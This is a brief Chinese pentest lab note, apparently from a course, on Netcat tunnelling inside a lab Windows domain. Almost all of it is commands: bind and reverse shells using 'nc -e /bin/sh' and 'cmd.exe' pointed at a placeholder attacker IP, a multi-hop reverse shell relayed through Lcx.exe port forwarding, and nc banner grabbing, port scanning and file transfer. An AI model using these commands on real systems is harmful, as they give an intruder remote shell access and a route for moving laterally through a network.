### 案例4-传输层转发隧道Netcat使用-检测,利用,功能
```
Kali2020-god\webserver-god\sqlserver|dc
1.双向连接反弹shell
正向：攻击连接受害
    受害：nc -ldp 1234 -e /bin/sh                      //linux
         nc -ldp 1234 -e c:\windows\system32\cmd.exe  //windows
    攻击：nc 192.168.76.132 1234                       //主动连接
反向：受害连接攻击
    攻击：nc -lvp 1234
    受害：nc 攻击主机IP 1234 -e /bin/sh       
         nc 攻击主机IP 1234 -e c:\windows\system32\cmd.exe      
```
```
2.多向连接反弹shell-配合转发
反向：
god\Webserver：Lcx.exe -listen 2222 3333
god\Sqlserver：nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe
kali或本机：nc -v 192.168.76.143 3333
正向该怎么操作呢？实战中改怎么选择正向和反向？
```
```
3.相关netcat主要功能测试
指纹服务：nc -nv 192.168.76.143
端口扫描：nc -v -z 192.168.76.143 1-100
端口监听：nc -lvp xxxx
文件传输：nc -lp 1111 >1.txt | nc -vn xx.xx.x.x 1111 <1.txt -q 1
反弹Shell：见上
```